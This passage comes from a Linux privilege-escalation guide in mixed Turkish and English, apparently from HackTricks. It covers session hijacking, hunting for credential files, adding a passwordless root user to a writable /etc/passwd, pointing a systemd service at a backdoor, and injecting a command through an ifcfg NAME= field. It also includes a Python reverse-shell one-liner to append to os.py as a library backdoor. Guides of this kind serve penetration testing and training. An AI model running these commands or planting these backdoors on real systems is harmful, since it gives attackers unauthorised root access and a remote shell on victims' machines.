Access Control Lists (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve geleneksel ugo/rwx izinlerini **geçersiz kılabilir**. Bu izinler, sahip olmayan veya grubun bir üyesi olmayan belirli kullanıcılara hak verip/vermeyerek dosya veya dizin erişimi üzerinde daha fazla kontrol sağlar. Bu düzeydeki **granülerlik daha hassas erişim yönetimi sağlar**. Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Alın** sistemden belirli ACL'lere sahip dosyaları:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell oturumları

**eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**en yeni sürümlerde** yalnızca **kendi kullanıcınızın** screen oturumlarına **connect** edebileceksiniz. Ancak **oturumun içinde ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**screen oturumlarını listeleyin**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Oturuma bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **eski tmux sürümleri** ile ilgili bir sorundu. Bir ayrıcalıksız kullanıcı olarak root tarafından oluşturulmuş bir tmux (v2.1) oturumunu hijack edemedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Session'e bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB**'e bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

September 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) oluşturulan tüm SSL ve SSH anahtarları bu hatadan etkilenmiş olabilir.\
Bu hata, söz konusu işletim sistemlerinde yeni bir ssh anahtarı oluşturulurken ortaya çıkar; çünkü **sadece 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olduğunuzda karşılık gelen private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları şurada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH İlginç yapılandırma değerleri

- **PasswordAuthentication:** Parola ile kimlik doğrulamaya izin verilip verilmediğini belirtir. Varsayılan `no`'dur.
- **PubkeyAuthentication:** Public key ile kimlik doğrulamaya izin verilip verilmediğini belirtir. Varsayılan `yes`'tir.
- **PermitEmptyPasswords**: Parola ile kimlik doğrulamaya izin veriliyorsa, sunucunun boş parola dizelerine sahip hesaplara girişe izin verip vermediğini belirtir. Varsayılan `no`'dur.

### PermitRootLogin

Root'un ssh ile giriş yapıp yapamayacağını belirtir, varsayılan `no`'dur. Olası değerler:

- `yes`: root parola ve private key kullanarak giriş yapabilir
- `without-password` or `prohibit-password`: root sadece private key ile giriş yapabilir
- `forced-commands-only`: root sadece private key kullanarak ve komut seçenekleri belirtilmişse giriş yapabilir
- `no` : izin yok

### AuthorizedKeysFile

Kullanıcı kimlik doğrulaması için kullanılabilecek public key'leri içeren dosyaları belirtir. `%h` gibi, home dizini ile değiştirilecek tokenlar içerebilir. **You can indicate absolute paths** (starting in `/`) veya **relative paths from the user's home** gösterebilirsiniz. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, eğer kullanıcı "**testusername**" için **private** anahtarıyla giriş yapmaya çalışırsanız, ssh'in anahtarınızın public key'ini `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` içindekilerle karşılaştıracağını gösterir.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding, sunucunuzda (without passphrases!) anahtarları bırakmak yerine **local SSH keys'inizi kullanmanıza** olanak tanır. Böylece ssh ile bir **host**a **jump** yapıp oradan **başka bir host**a, **initial host**unuzda bulunan **key**i **using** ederek tekrar **jump** yapabilirsiniz.

Bu seçeneği `$HOME/.ssh.config` içinde şu şekilde ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
Dikkat: eğer `Host` `*` ise, kullanıcı her farklı makinaya geçtiğinde o host keys'e erişebilecek (bu bir güvenlik sorunu).

Dosya `/etc/ssh_config` bu **seçenekleri** **geçersiz kılabilir** ve bu yapılandırmaya izin verebilir veya engelleyebilir.\
Dosya `/etc/sshd_config` `AllowAgentForwarding` anahtar kelimesiyle ssh-agent forwarding'e **izin verebilir** veya **engelleyebilir** (varsayılan izinlidir).

Eğer bir ortamda Forward Agent yapılandırıldıysa, aşağıdaki sayfayı okuyun çünkü **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profil dosyaları

Dosya `/etc/profile` ve `/etc/profile.d/` altındaki dosyalar **kullanıcı yeni bir shell çalıştırdığında yürütülen script'lerdir**. Bu nedenle, eğer bunlardan herhangi birini **yazabilir veya değiştirebilirseniz you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Eğer herhangi tuhaf bir profile script bulunursa, bunu **hassas bilgiler** açısından kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir adla bulunabilir veya bir yedeği olabilir. Bu nedenle **tümünü bulun** ve dosyaları **okuyup okuyamadığınızı kontrol edin**; içlerinde **hashes** olup olmadığına bakın:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda `/etc/passwd` (veya eşdeğer) dosyasının içinde **password hashes** bulunabilir.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

Önce, aşağıdaki komutlardan biriyle bir parola oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ardından `hacker` kullanıcısını ekleyin ve oluşturulan parolayı ekleyin.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Örnek: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Artık `su` komutunu `hacker:hacker` ile kullanabilirsiniz

Alternatif olarak, parola olmadan sahte bir kullanıcı eklemek için aşağıdaki satırları kullanabilirsiniz.\
UYARI: bu, makinenin mevcut güvenliğini zayıflatabilir.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOT: BSD platformlarında `/etc/passwd` dosyası `/etc/pwd.db` ve `/etc/master.passwd` konumunda bulunur, ayrıca `/etc/shadow` `/etc/spwd.db` olarak yeniden adlandırılmıştır.

Bazı hassas dosyalara **yazıp yazamayacağınızı** kontrol etmelisiniz. Örneğin, bazı **servis yapılandırma dosyalarına** yazabiliyor musunuz?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Örneğin, makine bir **tomcat** sunucusu çalıştırıyorsa ve **modify the Tomcat service configuration file inside /etc/systemd/,** o zaman şu satırları değiştirebilirsiniz:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor'unuz, tomcat bir sonraki başlatıldığında çalıştırılacak.

### Klasörleri Kontrol Et

Aşağıdaki klasörler yedekler veya ilginç bilgiler içerebilir: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Muhtemelen sonuncusunu okuyamayacaksınız ama yine de deneyin)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Tuhaf Konum/Owned dosyalar
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Son birkaç dakika içinde değiştirilen dosyalar
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB dosyaları
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml dosyaları
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Gizli dosyalar
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH içindeki Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web dosyaları**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Yedekler**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Şifre içerebilecek bilinen dosyalar

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) kodunu inceleyin, şifre içerebilecek **birkaç olası dosyayı** arar.\
**Başka ilginç bir araç** olarak kullanabileceğiniz: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) Windows, Linux & Mac için yerel bilgisayarda depolanan birçok şifreyi almak için kullanılan açık kaynaklı bir uygulamadır.

### Loglar

Logları okuyabiliyorsanız, bunların içinde **ilginç/gizli bilgiler** bulabilirsiniz. Log ne kadar garipse, o kadar ilginç olur (muhtemelen).\
Ayrıca, bazı "**kötü**" yapılandırılmış (backdoored?) **denetim logları**, bu yazıda açıklandığı gibi içine **şifre kaydetmenize** izin verebilir: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
**Logları okumak için** [**adm**](interesting-groups-linux-pe/index.html#adm-group) grubu çok yardımcı olacaktır.

### Shell dosyaları
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Ayrıca dosya adında veya içeriğinde "**password**" kelimesini içeren dosyaları ve loglar içindeki IP'leri ve e‑postaları ya da hash regexlerini de kontrol etmelisiniz.\
Burada bunların hepsinin nasıl yapılacağını burada sıralamayacağım ama ilgileniyorsanız [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) tarafından yapılan son kontrolleri inceleyebilirsiniz.

## Yazılabilir dosyalar

### Python library hijacking

Eğer bir python scriptinin nerede çalıştırılacağını biliyorsanız ve o klasöre yazabiliyor veya python kütüphanelerini değiştirebiliyorsanız, OS kütüphanesini değiştirip backdoor ekleyebilirsiniz (python scriptinin çalıştırılacağı yere yazabiliyorsanız, os.py kütüphanesini kopyalayıp yapıştırın).

Kütüphaneye **backdoor the library** uygulamak için os.py kütüphanesinin sonuna aşağıdaki satırı ekleyin (IP ve PORT'u değiştirin):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate istismarı

`logrotate`'daki bir zafiyet, bir log dosyası veya üst dizinlerinde **yazma izinlerine** sahip kullanıcıların ayrıcalık yükseltmesine yol açabilir. Bunun nedeni, sıklıkla **root** olarak çalışan `logrotate`'in özellikle _**/etc/bash_completion.d/**_ gibi dizinlerde keyfi dosyalar çalıştıracak şekilde manipüle edilebilmesidir. İzinleri sadece _/var/log_ içinde değil, log rotasyonunun uygulandığı tüm dizinlerde kontrol etmek önemlidir.

> [!TIP]
> Bu zafiyet `logrotate` sürümü `3.18.0` ve daha eski sürümleri etkiler

Zafiyete dair daha ayrıntılı bilgi şu sayfada bulunabilir: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Bu zafiyeti [**logrotten**](https://github.com/whotwagner/logrotten) ile istismar edebilirsiniz.

Bu zafiyet [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** ile çok benzerdir; bu yüzden logları değiştirebildiğinizi gördüğünüzde, bu logları kimin yönettiğini kontrol edin ve logları symlinks ile değiştirerek ayrıcalıkları yükseltip yükseltemeyeceğinize bakın.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Eğer herhangi bir nedenle bir kullanıcı _/etc/sysconfig/network-scripts_ dizinine `ifcf-<whatever>` adında bir betik **yazabiliyor** **veya** mevcut bir betiği **düzenleyebiliyorsa**, o zaman sisteminiz **system is pwned**.

Network script'leri, örneğin _ifcg-eth0_, ağ bağlantıları için kullanılır. Tamamen .INI dosyaları gibi görünürler. Ancak Linux'ta Network Manager (dispatcher.d) tarafından ~sourced~ edilirler.

Benim durumumda, bu network script'lerindeki `NAME=` ataması doğru şekilde işlenmiyor. **İsimde boşluk varsa sistem boşluktan sonraki kısmı çalıştırmaya çalışır.** **İlk boşluktan sonraki her şey root olarak çalıştırılır.**

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Not: Network ile /bin/id_ arasında boşluk olduğunu unutmayın_)

### **init, init.d, systemd, and rc.d**

Dizin `/etc/init.d`, System V init (SysVinit) için **scripts**'lerin bulunduğu yerdir; **klasik Linux service management system**. İçinde servisleri `start`, `stop`, `restart` ve bazen `reload` etmek için scriptler bulunur. Bunlar doğrudan çalıştırılabilir veya `/etc/rc?.d/` içindeki sembolik linkler aracılığıyla yürütülebilir. Redhat sistemlerde alternatif yol `/etc/rc.d/init.d`'dir.

Diğer yandan, `/etc/init` **Upstart** ile ilişkilidir; Ubuntu tarafından tanıtılan daha yeni bir **servis yönetimi** olup, servis yönetimi görevleri için yapılandırma dosyaları kullanır. Upstart'a geçişe rağmen, Upstart içindeki uyumluluk katmanı nedeniyle SysVinit scriptleri Upstart yapılandırmalarıyla birlikte kullanılmaya devam eder.

**systemd**, on-demand daemon başlatma, automount yönetimi ve sistem durum snapshot'ları gibi gelişmiş özellikler sunan modern bir initialization ve servis yöneticisi olarak öne çıkar. Dosyaları dağıtım paketleri için `/usr/lib/systemd/` ve yönetici değişiklikleri için `/etc/systemd/system/` altında düzenleyerek sistem yönetimini kolaylaştırır.

## Diğer Hileler

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks genellikle ayrıcalıklı kernel işlevselliğini userspace manager'a açmak için bir syscall'i hook'lar. Zayıf manager authentication (ör. FD-order'a dayalı signature checks veya zayıf password şemaları) bir local app'in manager'ı taklit ederek zaten-rootlu cihazlarda root'a yükselmesine olanak verebilir. Daha fazla bilgi ve exploitation detayları için:

{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations, process command lines'tan bir binary path çıkarıp bunu -v ile privileged context altında çalıştırabilir. İzin verici pattern'ler (ör. \S kullanımı) writable konumlardaki attacker-staged listener'larla (ör. /tmp/httpd) eşleşebilir, bu da root olarak çalıştırılmaya yol açar (CWE-426 Untrusted Search Path).

Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Linux yerel privilege escalation vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referanslar

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
